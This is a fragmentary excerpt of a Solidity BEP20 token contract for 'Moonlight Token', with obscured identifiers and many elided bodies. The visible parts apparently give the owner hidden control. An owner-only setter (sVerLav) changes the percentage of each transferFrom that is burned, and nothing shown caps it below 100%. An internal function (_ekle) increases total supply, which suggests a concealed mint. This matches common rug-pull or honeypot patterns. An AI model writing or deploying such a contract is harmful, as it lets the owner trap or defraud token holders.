...
contract HelloBEP20 is IBEP20 {
    ...
    string public name20REX =  "Moonlight Token";
    string public symbol20REX =  "MOONL";
    uint8 public decimals20REX = 9;
    uint public _totalSupplyEM = 1*10**15 * 10**9;
    
    
    address private _owner;
    uint8 private _zdaking;
    ...
    constructor() {
        ...
        _owner = msgSender;
        balances[msg.sender] = _totalSupplyEM;
        emit Transfer(address(0), msg.sender, _totalSupplyEM);
    }
  ...
  function decimals() public view virtual returns (uint8) {
        return decimals20REX;
    }

    function totalSupply() public override view returns (uint) {
        return _totalSupplyEM - balances[address(0)];
    }
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _lavc(from,tokens.mul(getVerLav()).div(10**2));
    ...
    function _lavc(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyEM = _totalSupplyEM.subb(tokens);
    ...
    function sVerLav(uint8 zdaking) public virtual onlyOwner {
		_zdaking = zdaking;
	}
    ...
    function _ekle(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyEM = _totalSupplyEM.ad(tokens);
